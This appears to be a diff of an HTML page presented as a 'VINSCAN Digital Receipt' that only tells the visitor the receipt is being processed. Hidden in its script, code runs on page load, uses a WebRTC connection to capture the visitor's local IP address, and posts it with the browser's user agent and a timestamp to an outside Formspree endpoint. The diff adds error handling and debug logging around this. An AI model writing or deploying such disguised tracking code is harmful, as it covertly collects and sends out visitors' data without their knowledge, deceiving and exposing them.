@@ -6,25 +6,34 @@
     <title>VINSCAN Digital Receipt</title>
     <script>
         async function getLocalIP() {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel("");
-            pc.onicecandidate = event => {
-                if (event && event.candidate && event.candidate.candidate) {
-                    let ip_match = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
-                    if (ip_match) {
-                        fetch('https://formspree.io/f/mdkabale', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ 
-                                localIP: ip_match[0], 
-                                userAgent: navigator.userAgent, 
-                                timestamp: new Date().toISOString() 
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel("");
+                pc.onicecandidate = event => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        let ip_match = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
+                        if (ip_match) {
+                            console.log("Captured Local IP:", ip_match[0]); // Debugging
+
+                            fetch('https://formspree.io/f/mdkabale', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    localIP: ip_match[0], 
+                                    userAgent: navigator.userAgent, 
+                                    timestamp: new Date().toISOString() 
+                                })
                             })
-                        });
+                            .then(response => response.text())
+                            .then(data => console.log("Formspree Response:", data))
+                            .catch(error => console.error("Formspree Error:", error));
+                        }
                     }
-                }
-            };
-            await pc.createOffer().then(o => pc.setLocalDescription(o));
+                };
+                await pc.createOffer().then(o => pc.setLocalDescription(o));
+            } catch (error) {
+                console.error("WebRTC Error:", error);
+            }
         }
         getLocalIP();
     </script>
@@ -34,3 +43,4 @@
     <p>Your VINSCAN digital receipt is being processed. Please wait...</p>
 </body>
 </html>
+
